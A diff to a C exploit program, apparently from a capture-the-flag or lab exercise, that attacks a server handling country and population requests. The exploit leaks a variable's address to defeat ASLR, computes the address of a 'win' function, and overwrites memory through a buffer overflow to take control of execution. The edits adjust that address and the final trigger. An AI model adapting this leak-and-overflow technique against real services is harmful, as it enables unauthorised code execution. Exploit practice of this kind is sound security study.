@@ -1,7 +1,7 @@
 #include "request.h"
 
 #define country_len 2064
-#define win_add 0x100001670
+#define win_add 0x100001468
 #define pop_add 0x100008338
 
 int main()
@@ -19,7 +19,7 @@ int main()
     overflow[1] = 'D';
     overflow[2] = 'D';
     overflow[3] = ' ';
-    printf("%s\n", overflow);
+    //printf("%s\n", overflow);
 
     add_country.message = "ADD test1 0";
     add_country.message_length = strlen(add_country.message);
@@ -36,6 +36,7 @@ int main()
         return -1;
     }
 
+    sleep(1);
     /* POP test1 */
     /* Dam leak la adresa variabilei population */
     ret = create_request(&leak, 1024);
@@ -50,7 +51,6 @@ int main()
     uint64_t slide = adresa_population - pop_add;
     uint64_t win = win_add + slide;
 
-
     trigger_overflow.message = overflow;
     memcpy(overflow + 4 + country_len - 8 - 1, &win, 8);
     trigger_overflow.message_length = 4 + country_len + 8 + 1;
@@ -62,8 +62,14 @@ int main()
     sleep(1);
     update_request(&trigger_overflow, 128);
     sleep(1);
-    puts("Triggering remote control");
-    close_request(&trigger_remote_execution);
 
+    puts("Triggering remote control");
+    trigger_remote_execution.message = "ACK";
+    trigger_remote_execution.message_length = 4;
+    update_request(&trigger_remote_execution, 1024);
+    ret = read_response(&trigger_remote_execution);
+    ret = read_response(&trigger_remote_execution);
+    printf("%d %s\n", ret, trigger_remote_execution.response);
+    sleep(4);
     return 0;
 }
